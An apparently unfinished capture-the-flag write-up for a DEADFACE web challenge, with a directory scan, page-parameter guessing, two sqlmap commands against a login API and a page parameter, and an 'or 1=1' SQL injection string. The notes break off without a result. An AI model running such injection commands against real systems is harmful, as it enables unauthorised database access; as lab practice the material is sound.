# Target List 1

Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. 
See if you can find any targets they are trying to hide.

http://targetlist.deadface.io:3001

Submit the flag as flag{flag-text}

## Attempt

http://targetlist.deadface.io:3001/pages


```sh
gobuster dir --url http://targetlist.deadface.io:3001 -w /usr/share/wordlists/dirb/common.txt
```

```sh
```
http://targetlist.deadface.io:3001/pages?page=6C  => FL
6C17

http://targetlist.deadface.io:3001/pages?page=6C17

login - http://targetlist.deadface.io:3001/api/login
{"username":"test","password":"test"}

```sh
sqlmap -u "http://targetlist.deadface.io:3001/api/login" --data "{\"username\":\"*\",\"password\":\"*\"}" --dbs --ignore-code=401


sqlmap -u "http://targetlist.deadface.io:3001/pages?page=*" --dbs
```

'or 1=1 %27or%201%3D1


%%
